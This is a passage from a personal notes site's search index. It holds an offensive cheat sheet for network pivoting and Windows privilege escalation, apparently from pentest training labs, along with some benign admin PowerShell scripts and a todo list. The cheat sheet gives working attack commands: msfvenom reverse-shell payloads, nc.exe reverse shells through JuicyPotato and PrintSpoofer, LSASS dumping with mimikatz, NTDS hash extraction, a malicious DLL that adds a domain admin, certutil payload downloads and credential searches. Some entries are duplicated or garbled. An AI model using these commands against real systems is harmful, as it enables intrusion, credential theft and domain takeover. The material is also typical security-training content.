port forward on port <code>9050</code> and establishes an SSH tunnel with the target. This is part of setting up a SOCKS proxy.</p> <p><code>tail -4 /etc/proxychains.conf</code></p> <p>Linux-based command used to display the last 4 lines of /etc/proxychains.conf. Can be used to ensure socks configurations are in place.</p> <p><code>proxychains nmap -v -sn 172.16.5.1-200</code></p> <p>Used to send traffic generated by an Nmap scan through Proxychains and a SOCKS proxy. Scan is performed against the hosts in the specified range <code>172.16.5.1-200</code> with increased verbosity (<code>-v</code>) disabling ping scan (<code>-sn</code>).</p> <p><code>proxychains nmap -v -Pn -sT 172.16.5.19</code></p> <p>Used to send traffic generated by an Nmap scan through Proxychains and a SOCKS proxy. Scan is performed against 172.16.5.19 with increased verbosity (<code>-v</code>), disabling ping discover (<code>-Pn</code>), and using TCP connect scan type (<code>-sT</code>).</p> <p><code>proxychains msfconsole</code></p> <p>Uses Proxychains to open Metasploit and send all generated network traffic through a SOCKS proxy.</p> <p><code>msf6 &gt; search rdp_scanner</code></p> <p>Metasploit search that attempts to find a module called <code>rdp_scanner</code>.</p> <p><code>proxychains xfreerdp /v:&lt;IPaddressofTarget&gt; /u:lafi /p:pass@123</code></p> <p>Used to connect to a target using RDP and a set of credentials using proxychains. This will send all traffic through a SOCKS proxy.</p> <p><code>msfvenom -p windows/x64/meterpreter/reverse_https lhost= &lt;InteralIPofPivotHost&gt; -f exe -o backupscript.exe LPORT=8080</code></p> <p>Uses msfvenom to generate a Windows-based reverse HTTPS Meterpreter payload that will send a call back to the IP address specified following <code>lhost=</code> on local port 8080 (<code>LPORT=8080</code>). Payload will take the form of an executable file called <code>backupscript.exe</code>.</p> <p><code>msf6 &gt; use exploit/multi/handler</code></p> <p>Used to select the multi-handler exploit module in Metasploit.</p> <p><code>scp backupscript.exe ubuntu@&lt;ipAddressofTarget&gt;:~/</code></p> <p>Uses secure copy protocol (<code>scp</code>) to transfer the file <code>backupscript.exe</code> to the specified host and places it in the Ubuntu user's home directory (<code>:~/</code>).</p> <p><code>python3 -m http.server 8123</code></p> <p>Uses Python3 to start a simple HTTP server listening on port <code>8123</code>. Can be used to retrieve files from a host.</p> <p><code>Invoke-WebRequest -Uri \"[http://172.16.5.129:8123/backupscript.exe](http://172.16.5.129:8123/backupscript.exe)\" -OutFile \"C:\\backupscript.exe\"</code></p> <p>PowerShell command used to download a file called backupscript.exe from a webserver (<code>172.16.5.129:8123</code>) and then save the file to location specified after <code>-OutFile</code>.</p> <p><code>ssh -R &lt;InternalIPofPivotHost&gt;:8080:0.0.0.0:80 ubuntu@&lt;ipAddressofTarget&gt; -vN</code></p> <p>SSH command used to create a reverse SSH tunnel from a target to an attack host. Traffic is forwarded on port <code>8080</code> on the attack host to port <code>80</code> on the target.</p> <p><code>msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=&lt;IPaddressofAttackHost -f elf -o backupjob LPORT=8080</code></p> <p>Uses msfveom to generate a Linux-based Meterpreter reverse TCP payload that calls back to the IP specified after <code>LHOST=</code> on port 8080 (<code>LPORT=8080</code>). Payload takes the form of an executable elf file called backupjob.</p> <p><code>msf6&gt; run post/multi/gather/ping_sweep RHOSTS=172.16.5.0/23</code></p> <p>Metasploit command that runs a ping sweep module against the specified network segment (<code>RHOSTS=172.16.5.0/23</code>).</p> <p><code>for i in {1...254} ;do (ping -c 1 172.16.5.$i | grep \"bytes from\" &amp;) ;done</code></p> <p>For Loop used on a Linux-based system to discover devices in a specified network segment.</p> <p><code>for /L %i in (1 1 254) do ping 172.16.5.%i -n 1 -w 100 | find \"Reply\"</code></p> <p>For Loop used on a Windows-based system to discover devices in a specified network segment.</p> <p><code>1..254 | % {\"172.16.5.$($_): $(Test-Connection -count 1 -comp 172.15.5.$($_) -quiet)\"}</code></p> <p>PowerShell one-liner used to ping addresses 1 - 254 in the specified network segment.</p> <p><code>msf6 &gt; use auxiliary/server/socks_proxy</code></p> <p>Metasploit command that selects the <code>socks_proxy</code> auxiliary module.</p> <p><code>msf6 auxiliary(server/socks_proxy) &gt; jobs</code></p> <p>Metasploit command that lists all currently running jobs.</p> <p><code>socks4 127.0.0.1 9050</code></p> <p>Line of text that should be added to /etc/proxychains.conf to ensure a SOCKS version 4 proxy is used in combination with proxychains on the specified IP address and port.</p> <p><code>Socks5 127.0.0.1 1080</code></p> <p>Line of text that should be added to /etc/proxychains.conf to ensure a SOCKS version 5 proxy is used in combination with proxychains on the specified IP address and port.</p> <p><code>msf6 &gt; use post/multi/manage/autoroute</code></p> <p>Metasploit command used to select the autoroute module.</p> <p><code>meterpreter &gt; help portfwd</code></p> <p>Meterpreter command used to display the features of the portfwd command.</p> <p><code>meterpreter &gt; portfwd add -l 3300 -p 3389 -r &lt;IPaddressofTarget&gt;</code></p> <p>Meterpreter-based portfwd command that adds a forwarding rule to the current Meterpreter session. This rule forwards network traffic on port 3300 on the local machine to port 3389 (RDP) on the target.</p> <p><code>xfreerdp /v:localhost:3300 /u:victor /p:pass@123</code></p> <p>Uses xfreerdp to connect to a remote host through localhost:3300 using a set of credentials. Port forwarding rules must be in place for this to work properly.</p> <p><code>netstat -antp</code></p> <p>Used to display all (<code>-a</code>) active network connections with associated process IDs. <code>-t</code> displays only TCP connections.<code>-n</code> displays only numerical addresses. <code>-p</code> displays process IDs associated with each displayed connection.</p> <p><code>meterpreter &gt; portfwd add -R -l 8081 -p 1234 -L &lt;IPaddressofAttackHost&gt;</code></p> <p>Meterpreter-based portfwd command that adds a forwarding rule that directs traffic coming on on port 8081 to the port <code>1234</code> listening on the IP address of the Attack Host.</p> <p><code>meterpreter &gt; bg</code></p> <p>Meterpreter-based command used to run the selected metepreter session in the background. Similar to background a process in Linux</p> <p><code>socat TCP4-LISTEN:8080,fork TCP4:&lt;IPaddressofAttackHost&gt;:80</code></p> <p>Uses Socat to listen on port 8080 and then to fork when the connection is received. It will then connect to the attack host on port 80.</p> <p><code>socat TCP4-LISTEN:8080,fork TCP4:&lt;IPaddressofTarget&gt;:8443</code></p> <p>Uses Socat to listen on port 8080 and then to fork when the connection is received. Then it will connect to the target host on port 8443.</p> <p><code>plink -D 9050 ubuntu@&lt;IPaddressofTarget&gt;</code></p> <p>Windows-based command that uses PuTTY's Plink.exe to perform SSH dynamic port forwarding and establishes an SSH tunnel with the specified target. This will allow for proxy chaining on a Windows host, similar to what is done with Proxychains on a Linux-based host.</p> <p><code>sudo apt-get install sshuttle</code></p> <p>Uses apt-get to install the tool sshuttle.</p> <p><code>sudo sshuttle -r ubuntu@10.129.202.64 172.16.5.0 -v</code></p> <p>Runs sshuttle, connects to the target host, and creates a route to the 172.16.5.0 network so traffic can pass from the attack host to hosts on the internal network (<code>172.16.5.0</code>).</p> <p><code>sudo git clone [https://github.com/klsecservices/rpivot.git</code>](https://github.com/klsecservices/rpivot.git%60)</p> <p>Clones the rpivot project GitHub repository.</p> <p><code>sudo apt-get install python2.7</code></p> <p>Uses apt-get to install python2.7.</p> <p><code>python2.7 server.py --proxy-port 9050 --server-port 9999 --server-ip 0.0.0.0</code></p> <p>Used to run the rpivot server (<code>server.py</code>) on proxy port <code>9050</code>, server port <code>9999</code> and listening on any IP address (<code>0.0.0.0</code>).</p> <p><code>scp -r rpivot ubuntu@&lt;IPaddressOfTarget&gt;</code></p> <p>Uses secure copy protocol to transfer an entire directory and all of its contents to a specified target.</p> <p><code>python2.7 client.py --server-ip 10.10.14.18 --server-port 9999</code></p> <p>Used to run the rpivot client (<code>client.py</code>) to connect to the specified rpivot server on the appropriate port.</p> <p><code>proxychains firefox-esr &lt;IPaddressofTargetWebServer&gt;:80</code></p> <p>Opens firefox with Proxychains and sends the web request through a SOCKS proxy server to the specified destination web server.</p> <p><code>python client.py --server-ip &lt;IPaddressofTargetWebServer&gt; --server-port 8080 --ntlm-proxy-ip IPaddressofProxy&gt; --ntlm-proxy-port 8081 --domain &lt;nameofWindowsDomain&gt; --username &lt;username&gt; --password &lt;password&gt;</code></p> <p>Use to run the rpivot client to connect to a web server that is using HTTP-Proxy with NTLM authentication.</p> <p><code>netsh.exe interface portproxy add v4tov4 listenport=8080 listenaddress=10.129.42.198 connectport=3389 connectaddress=172.16.5.25</code></p> <p>Windows-based command that uses <code>netsh.exe</code> to configure a portproxy rule called <code>v4tov4</code> that listens on port 8080 and forwards connections to the destination 172.16.5.25 on port 3389.</p> <p><code>netsh.exe interface portproxy show v4tov4</code></p> <p>Windows-based command used to view the configurations of a portproxy rule called v4tov4.</p> <p><code>git clone [https://github.com/iagox86/dnscat2.git</code>](https://github.com/iagox86/dnscat2.git%60)</p> <p>Clones the <code>dnscat2</code> project GitHub repository.</p> <p><code>sudo ruby dnscat2.rb --dns host=10.10.14.18,port=53,domain=inlanefreight.local --no-cache</code></p> <p>Used to start the dnscat2.rb server running on the specified IP address, port (<code>53</code>) &amp; using the domain <code>inlanefreight.local</code> with the no-cache option enabled.</p> <p><code>git clone [https://github.com/lukebaggett/dnscat2-powershell.git</code>](https://github.com/lukebaggett/dnscat2-powershell.git%60)</p> <p>Clones the dnscat2-powershell project Github repository.</p> <p><code>Import-Module dnscat2.ps1</code></p> <p>PowerShell command used to import the dnscat2.ps1 tool.</p> <p><code>Start-Dnscat2 -DNSserver 10.10.14.18 -Domain inlanefreight.local -PreSharedSecret 0ec04a91cd1e963f8c03ca499d589d21 -Exec cmd</code></p> <p>PowerShell command used to connect to a specified dnscat2 server using a IP address, domain name and preshared secret. The client will send back a shell connection to the server (<code>-Exec cmd</code>).</p> <p><code>dnscat2&gt; ?</code></p> <p>Used to list dnscat2 options.</p> <p><code>dnscat2&gt; window -i 1</code></p> <p>Used to interact with an established dnscat2 session.</p> <p><code>./chisel server -v -p 1234 --socks5</code></p> <p>Used to start a chisel server in verbose mode listening on port <code>1234</code> using SOCKS version 5.</p> <p><code>./chisel client -v 10.129.202.64:1234 socks</code></p> <p>Used to connect to a chisel server at the specified IP address &amp; port using socks.</p> <p><code>git clone [https://github.com/utoni/ptunnel-ng.git</code>](https://github.com/utoni/ptunnel-ng.git%60)</p> <p>Clones the ptunnel-ng project GitHub repository.</p> <p><code>sudo ./autogen.sh</code></p> <p>Used to run the autogen.sh shell script that will build the necessary ptunnel-ng files.</p> <p><code>sudo ./ptunnel-ng -r10.129.202.64 -R22</code></p> <p>Used to start the ptunnel-ng server on the specified IP address (<code>-r</code>) and corresponding port (<code>-R22</code>).</p> <p><code>sudo ./ptunnel-ng -p10.129.202.64 -l2222 -r10.129.202.64 -R22</code></p> <p>Used to connect to a specified ptunnel-ng server through local port 2222 (<code>-l2222</code>).</p> <p><code>ssh -p2222 -lubuntu 127.0.0.1</code></p> <p>SSH command used to connect to an SSH server through a local port. This can be used to tunnel SSH traffic through an ICMP tunnel.</p> <p><code>regsvr32.exe SocksOverRDP-Plugin.dll</code></p> <p>Windows-based command used to register the SocksOverRDP-PLugin.dll.</p> <p><code>netstat -antb |findstr 1080</code></p> <p>Windows-based command used to list TCP network connections listening on port 1080.</p>"},{"location":"Powershell%20Scripts/","title":"Powershell Scripts","text":"<p>Powershell Scripts</p>"},{"location":"Powershell%20Scripts/#admin-elevation","title":"Admin Elevation","text":"<pre><code>function IsAdministrator\n{\n    $Identity = [System.Security.Principal.WindowsIdentity]::GetCurrent()\n    $Principal = New-Object System.Security.Principal.WindowsPrincipal($Identity)\n    $Principal.IsInRole([System.Security.Principal.WindowsBuiltInRole]::Administrator)\n}\n\n\nfunction IsUacEnabled\n{\n    (Get-ItemProperty HKLM:\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System).EnableLua -ne 0\n}\n\n#\n# Main script\n#\nif (!(IsAdministrator))\n{\n    if (IsUacEnabled)\n    {\n        [string[]]$argList = @('-NoProfile', '-NoExit', '-File', $MyInvocation.MyCommand.Path)\n        $argList += $MyInvocation.BoundParameters.GetEnumerator() | Foreach {\"-$($_.Key)\", \"$($_.Value)\"}\n        $argList += $MyInvocation.UnboundArguments\n        Start-Process PowerShell.exe -Verb Runas -WorkingDirectory $pwd -ArgumentList $argList \n        return\n    }\n    else\n    {\n        throw \"You must be administrator to run this script\"\n    }\n}\n</code></pre>"},{"location":"Powershell%20Scripts/#reg-key-deployment","title":"Reg Key deployment","text":"<ul> <li>Values must be changed for use case. This script deploys two different keys and it's function is to lock windows to a particular version (Prevent win11 auto update)</li> </ul> <pre><code>$registryPath = \"HKLM:\\Software\\Policies\\Microsoft\\Windows\\WindowsUpdate\"\n\n$Name = \"TargetReleaseVersion\"\n\n$value = \"1\"\n\nIF(!(Test-Path $registryPath))\n\n  {\n\n    New-Item -Path $registryPath -Force | Out-Null\n\n    New-ItemProperty -Path $registryPath -Name $name -Value $value `\n        -PropertyType DWORD -Force | Out-Null}\n\n ELSE {\n\n    New-ItemProperty -Path $registryPath -Name $name -Value $value `\n        -PropertyType DWORD -Force | Out-Null}\n\n$registryPath = \"HKLM:\\Software\\Policies\\Microsoft\\Windows\\WindowsUpdate\"\n\n$Name = \"TargetReleaseVersionInfo\"\n\n$value = \"22h2\"\n\nIF(!(Test-Path $registryPath))\n\n  {\n\n    New-Item -Path $registryPath -Force | Out-Null\n\n    New-ItemProperty -Path $registryPath -Name $name -Value $value `\n        -PropertyType STRING -Force | Out-Null}\n\n ELSE {\n\n    New-ItemProperty -Path $registryPath -Name $name -Value $value `\n        -PropertyType STRING -Force | Out-Null}\n</code></pre>"},{"location":"Powershell%20Scripts/#move-fsmo-roles","title":"Move FSMO roles","text":"<pre><code>Move-ADDirectoryServerOperationMasterRole \u2013Identity \"Target_DC_Name\" \u2013OperationMasterRole 0,1,2,3,4\n\n</code></pre>"},{"location":"Priv%20esc/","title":"Priv esc","text":"<p>This is a detailed cheat sheet for windows PE, its very handy in many certification like OSCP, OSCE and CRTE</p> <p><code>ipconfig /all</code></p> <p>Get interface, IP address and DNS information</p> <p><code>arp -a</code></p> <p>Review ARP table</p> <p><code>route print</code></p> <p>Review routing table</p> <p><code>Get-MpComputerStatus</code></p> <p>Check Windows Defender status</p> <p><code>Get-AppLockerPolicy -Effective | select -ExpandProperty RuleCollections</code></p> <p>List AppLocker rules</p> <p><code>Get-AppLockerPolicy -Local | Test-AppLockerPolicy -path C:\\Windows\\System32\\cmd.exe -User Everyone</code></p> <p>Test AppLocker policy</p> <p><code>set</code></p> <p>Display all environment variables</p> <p><code>systeminfo</code></p> <p>View detailed system configuration information</p> <p><code>wmic qfe</code></p> <p>Get patches and updates</p> <p><code>wmic product get name</code></p> <p>Get installed programs</p> <p><code>tasklist /svc</code></p> <p>Display running processes</p> <p><code>query user</code></p> <p>Get logged-in users</p> <p><code>echo %USERNAME%</code></p> <p>Get current user</p> <p><code>whoami /priv</code></p> <p>View current user privileges</p> <p><code>whoami /groups</code></p> <p>View current user group information</p> <p><code>net user</code></p> <p>Get all system users</p> <p><code>net localgroup</code></p> <p>Get all system groups</p> <p><code>net localgroup administrators</code></p> <p>View details about a group</p> <p><code>net accounts</code></p> <p>Get passsword policy</p> <p><code>netstat -ano</code></p> <p>Display active network connections</p> <p><code>pipelist.exe /accepteula</code></p> <p>List named pipes</p> <p><code>gci \\\\.\\pipe\\</code></p> <p>List named pipes with PowerShell</p> <p><code>accesschk.exe /accepteula \\\\.\\Pipe\\lsass -v</code></p> <p>Review permissions on a named pipe</p> <p><code>mssqlclient.py sql_dev@10.129.43.30 -windows-auth</code></p> <p>Connect using mssqlclient.py</p> <p><code>enable_xp_cmdshell</code></p> <p>Enable xp_cmdshell with mssqlclient.py</p> <p><code>xp_cmdshell whoami</code></p> <p>Run OS commands with xp_cmdshell</p> <p><code>c:\\tools\\JuicyPotato.exe -l 53375 -p c:\\windows\\system32\\cmd.exe -a \"/c c:\\tools\\nc.exe 10.10.14.3 443 -e cmd.exe\" -t *</code></p> <p>Escalate privileges with JuicyPotato</p> <p><code>c:\\tools\\PrintSpoofer.exe -c \"c:\\tools\\nc.exe 10.10.14.3 8443 -e cmd\"</code></p> <p>Escalating privileges with PrintSpoofer</p> <p><code>procdump.exe -accepteula -ma lsass.exe lsass.dmp</code></p> <p>Take memory dump with ProcDump</p> <p><code>sekurlsa::minidump lsass.dmp</code> and <code>sekurlsa::logonpasswords</code></p> <p>Use MimiKatz to extract credentials from LSASS memory dump</p> <p><code>dir /q C:\\backups\\wwwroot\\web.config</code></p> <p>Checking ownership of a file</p> <p><code>takeown /f C:\\backups\\wwwroot\\web.config</code></p> <p>Taking ownership of a file</p> <p><code>Get-ChildItem -Path \u2018C:\\backups\\wwwroot\\web.config\u2019 | select name,directory, @{Name=\u201cOwner\u201d;Expression={(Ge t-ACL $_.Fullname).Owner}}</code></p> <p>Confirming changed ownership of a file</p> <p><code>icacls \u201cC:\\backups\\wwwroot\\web.config\u201d /grant lafi:F</code></p> <p>Modifying a file ACL</p> <p><code>secretsdump.py -ntds ntds.dit -system SYSTEM -hashes lmhash:nthash LOCAL</code></p> <p>Extract hashes with secretsdump.py</p> <p><code>robocopy /B E:\\Windows\\NTDS .\\ntds ntds.dit</code></p> <p>Copy files with ROBOCOPY</p> <p><code>wevtutil qe Security /rd:true /f:text | Select-String \"/user\"</code></p> <p>Searching security event logs</p> <p><code>wevtutil qe Security /rd:true /f:text /r:share01 /u:julie.clay /p:Welcome1 | findstr \"/user\"</code></p> <p>Passing credentials to wevtutil</p> <p><code>Get-WinEvent -LogName security | where { $_.ID -eq 4688 -and $_.Properties[8].Value -like '*/user*' } | Select-Object @{name='CommandLine';expression={ $_.Properties[8].Value }}</code></p> <p>Searching event logs with PowerShell</p> <p><code>msfvenom -p windows/x64/exec cmd='net group \"domain admins\" netadm /add /domain' -f dll -o adduser.dll</code></p> <p>Generate malicious DLL</p> <p><code>dnscmd.exe /config /serverlevelplugindll adduser.dll</code></p> <p>Loading a custom DLL with dnscmd</p> <p><code>wmic useraccount where name=\"netadm\" get sid</code></p> <p>Finding a user's SID</p> <p><code>sc.exe sdshow DNS</code></p> <p>Checking permissions on DNS service</p> <p><code>sc stop dns</code></p> <p>Stopping a service</p> <p><code>sc start dns</code></p> <p>Starting a service</p> <p><code>reg query \\\\10.129.43.9\\HKLM\\SYSTEM\\CurrentControlSet\\Services\\DNS\\Parameters</code></p> <p>Querying a registry key</p> <p><code>reg delete \\\\10.129.43.9\\HKLM\\SYSTEM\\CurrentControlSet\\Services\\DNS\\Parameters /v ServerLevelPluginDll</code></p> <p>Deleting a registry key</p> <p><code>sc query dns</code></p> <p>Checking a service status</p> <p><code>Set-DnsServerGlobalQueryBlockList -Enable $false -ComputerName dc01.inlanefreight.local</code></p> <p>Disabling the global query block list</p> <p><code>Add-DnsServerResourceRecordA -Name wpad -ZoneName inlanefreight.local -ComputerName dc01.inlanefreight.local -IPv4Address 10.10.14.3</code></p> <p>Adding a WPAD record</p> <p><code>cl /DUNICODE /D_UNICODE EnableSeLoadDriverPrivilege.cpp</code></p> <p>Compile with cl.exe</p> <p><code>reg add HKCU\\System\\CurrentControlSet\\CAPCOM /v ImagePath /t REG_SZ /d \"\\??\\C:\\Tools\\Capcom.sys\"</code></p> <p>Add reference to a driver (1)</p> <p><code>reg add HKCU\\System\\CurrentControlSet\\CAPCOM /v Type /t REG_DWORD /d 1</code></p> <p>Add reference to a driver (2)</p> <p><code>.\\DriverView.exe /stext drivers.txt</code> and <code>cat drivers.txt | Select-String -pattern Capcom</code></p> <p>Check if driver is loaded</p> <p><code>EoPLoadDriver.exe System\\CurrentControlSet\\Capcom c:\\Tools\\Capcom.sys</code></p> <p>Using EopLoadDriver</p> <p><code>c:\\Tools\\PsService.exe security AppReadiness</code></p> <p>Checking service permissions with PsService</p> <p><code>sc config AppReadiness binPath= \"cmd /c net localgroup Administrators server_adm /add\"</code></p> <p>Modifying a service binary path</p>"},{"location":"Priv%20esc/#credential-theftfindstr-sim-cpassword-txt-ini-cfg-config-xml","title":"Credential Theft<code>findstr /SIM /C:\"password\" *.txt *ini *.cfg *.config *.xml</code>","text":"<p>Search for files with the phrase \"password\"</p> <p><code>gc 'C:\\Users\\lafi\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\Custom Dictionary.txt' | Select-String password</code></p> <p>Searching for passwords in Chrome dictionary files</p> <p><code>(Get-PSReadLineOption).HistorySavePath</code></p> <p>Confirm PowerShell history save path</p> <p><code>gc (Get-PSReadLineOption).HistorySavePath</code></p> <p>Reading PowerShell history file</p> <p><code>$credential = Import-Clixml -Path 'C:\\scripts\\pass.xml'</code></p> <p>Decrypting PowerShell credentials</p> <p><code>cd c:\\Users\\lafi\\Documents &amp; findstr /SI /M \"password\" *.xml *.ini *.txt</code></p> <p>Searching file contents for a string</p> <p><code>findstr /si password *.xml *.ini *.txt *.config</code></p> <p>Searching file contents for a string</p> <p><code>findstr /spin \"password\" *.*</code></p> <p>Searching file contents for a string</p> <p><code>select-string -Path C:\\Users\\lafi\\Documents\\*.txt -Pattern password</code></p> <p>Search file contents with PowerShell</p> <p><code>dir /S /B *pass*.txt == *pass*.xml == *pass*.ini == *cred* == *vnc* == *.config*</code></p> <p>Search for file extensions</p> <p><code>where /R C:\\ *.config</code></p> <p>Search for file extensions</p> <p><code>Get-ChildItem C:\\ -Recurse -Include *.rdp, *.config, *.vnc, *.cred -ErrorAction Ignore</code></p> <p>Search for file extensions using PowerShell</p> <p><code>cmdkey /list</code></p> <p>List saved credentials</p> <p><code>.\\SharpChrome.exe logins /unprotect</code></p> <p>Retrieve saved Chrome credentials</p> <p><code>.\\lazagne.exe -h</code></p> <p>View LaZagne help menu</p> <p><code>.\\lazagne.exe all</code></p> <p>Run all LaZagne modules</p> <p><code>Invoke-SessionGopher -Target WINLPE-SRV01</code></p> <p>Running SessionGopher</p> <p><code>netsh wlan show profile</code></p> <p>View saved wireless networks</p> <p><code>netsh wlan show profile ilfreight_corp key=clear</code></p> <p>Retrieve saved wireless passwords</p> <p><code>certutil.exe -urlcache -split -f [http://10.10.14.3:8080/shell.bat](http://10.10.14.3:8080/shell.bat) shell.bat</code></p> <p>Transfer file with certutil</p> <p><code>certutil -encode file1 encodedfile</code></p> <p>Encode file with certutil</p> <p><code>certutil -decode encodedfile file2</code></p> <p>Decode file with certutil</p> <p><code>reg query HKEY_CURRENT_USER\\Software\\Policies\\Microsoft\\Windows\\Installer</code></p> <p>Query for always install elevated registry key (1)</p> <p><code>reg query HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer</code></p> <p>Query for always install elevated registry key (2)</p> <p><code>msfvenom -p windows/shell_reverse_tcp lhost=10.10.14.3 lport=9443 -f msi &gt; aie.msi</code></p> <p>Generate a malicious MSI package</p> <p><code>msiexec /i c:\\users\\lafi\\desktop\\aie.msi /quiet /qn /norestart</code></p> <p>Executing an MSI package from command line</p> <p><code>schtasks /query /fo LIST /v</code></p> <p>Enumerate scheduled tasks</p> <p><code>Get-ScheduledTask | select TaskName,State</code></p> <p>Enumerate scheduled tasks with PowerShell</p> <p><code>.\\accesschk64.exe /accepteula -s -d C:\\Scripts\\</code></p> <p>Check permissions on a directory</p> <p><code>Get-LocalUser</code></p> <p>Check local user description field</p> <p><code>Get-WmiObject -Class Win32_OperatingSystem | select Description</code></p> <p>Enumerate computer description field</p> <p><code>guestmount -a SQL01-disk1.vmdk -i --ro /mnt/vmd</code></p> <p>Mount VMDK on Linux</p> <p><code>guestmount --add WEBSRV10.vhdx --ro /mnt/vhdx/ -m /dev/sda1</code></p> <p>Mount VHD/VHDX on Linux</p> <p><code>sudo python2.7 windows-exploit-suggester.py --update</code></p> <p>Update Windows Exploit Suggester database</p> <p><code>python2.7 windows-exploit-suggester.py --database 2021-05-13-mssb.xls --systeminfo win7lpe-systeminfo.txt</code></p> <p>Running Windows Exploit Suggester</p> <p>REG QUERY HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System /v EnableLUAREG QUERY HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System /v EnableLUA</p> <p>Confirming UAC is enabledConfirming UAC is enabled</p> <p>REG QUERY HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System /v ConsentPromptBehaviorAdminREG QUERY HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System /v ConsentPromptBehaviorAdmin</p> <p>Checking UAC levelChecking UAC level</p> <p><code>[environment]::OSVersion.Version``[environment]::OSVersion.Version</code></p> <p>Checking Windows versionChecking Windows version</p> <p><code>cmd /c echo %PATH%``cmd /c echo %PATH%</code></p> <p>Reviewing path variableReviewing path variable</p> <p><code>.\\SharpUp.exe audit``.\\SharpUp.exe audit</code></p> <p>Running SharpUpRunning SharpUp</p> <p><code>icacls \"C:\\Program Files (x86)\\PCProtect\\SecurityService.exe\"``icacls \"C:\\Program Files (x86)\\PCProtect\\SecurityService.exe\"</code></p> <p>Checking service permissions with icaclsChecking service permissions with icacls</p> <p><code>cmd /c copy /Y SecurityService.exe \"C:\\Program Files (x86)\\PCProtect\\SecurityService.exe\"``cmd /c copy /Y SecurityService.exe \"C:\\Program Files (x86)\\PCProtect\\SecurityService.exe\"</code></p> <p>Replace a service binaryReplace a service binary</p> <p><code>wmic service get name,displayname,pathname,startmode | findstr /i \"auto\" | findstr /i /v \"c:\\windows\\\\\" | findstr /i /v \"\"\"``wmic service get name,displayname,pathname,startmode | findstr /i \"auto\" | findstr /i /v \"c:\\windows\\\\\" | findstr /i /v \"\"\"</code></p> <p>Searching for unquoted service pathsSearching for unquoted service paths</p> <p><code>accesschk.exe /accepteula \"mrb3n\" -kvuqsw hklm\\System\\CurrentControlSet\\services``accesschk.exe /accepteula \"mrb3n\" -kvuqsw hklm\\System\\CurrentControlSet\\services</code></p> <p>Checking for weak service ACLs in the RegistryChecking for weak service ACLs in the Registry</p> <p><code>Set-ItemProperty -Path HKLM:\\SYSTEM\\CurrentControlSet\\Services\\ModelManagerService -Name \"ImagePath\" -Value \"C:\\Users\\john\\Downloads\\nc.exe -e cmd.exe 10.10.10.205 443\"``Set-ItemProperty -Path HKLM:\\SYSTEM\\CurrentControlSet\\Services\\ModelManagerService -Name \"ImagePath\" -Value \"C:\\Users\\john\\Downloads\\nc.exe -e cmd.exe 10.10.10.205 443\"</code></p> <p>Changing ImagePath with PowerShellChanging ImagePath with PowerShell</p> <p><code>Get-CimInstance Win32_StartupCommand | select Name, command, Location, User | fl``Get-CimInstance Win32_StartupCommand | select Name, command, Location, User | fl</code></p> <p>Check startup programsCheck startup programs</p> <p><code>msfvenom -p windows/x64/meterpreter/reverse_https LHOST=10.10.14.3 LPORT=8443 -f exe &gt; maintenanceservice.exe``msfvenom -p windows/x64/meterpreter/reverse_https LHOST=10.10.14.3 LPORT=8443 -f exe &gt; maintenanceservice.exe</code></p> <p>Generating a malicious binaryGenerating a malicious binary</p> <p><code>get-process -Id 3324``get-process -Id 3324</code></p> <p>Enumerating a process ID with PowerShellEnumerating a process ID with PowerShell</p> <p><code>get-service | ? {$_.DisplayName -like 'Druva*'}``get-service | ? {$_.DisplayName -like 'Druva*'}</code></p> <p>Enumerate a running service by name with PowerShellEnumerate a running service by name with PowerShell</p> <p><code>curl http ://10.10.14.3:8080/srrstr.dll -O \"C:\\Users\\lafi\\AppData\\Local\\Microsoft\\WindowsApps\\srrstr.dll\"</code></p> <p>Downloading file with cURL in PowerShell</p> <p><code>rundll32 shell32.dll,Control_RunDLL C:\\Users\\sarah\\AppData\\Local\\Microsoft\\WindowsApps\\srrstr.dll</code></p> <p>Executing custom dll with rundll32.exe</p>"},{"location":"ToDo%20List/","title":"ToDo List","text":""},{"location":"ToDo%20List/#back-burner","title":"Back Burner","text":"<ul> <li> Network Probes</li> <li> Tech Wifi</li> <li> Idle logoff GPO for carlinville city</li> <li> Add time to CVCPA ticket for vpn from 12/12</li> </ul>"},{"location":"ToDo%20List/#open-projects","title":"Open Projects","text":"<ul> <li> Setup UDM for United Chevy [[10-20-2022]]</li> </ul>"},{"location":"ToDo%20List/#done","title":"Done","text":"<p>Complete</p> <p>%% kanban:settings</p> <pre><code>{\"kanban-plugin\":\"basic\",\"show-checkboxes\":true,\"show-relative-date\":false,\"new-note-folder\":\"To-Do Folder\"}\n</code></pre> <p>%%</p>"}]}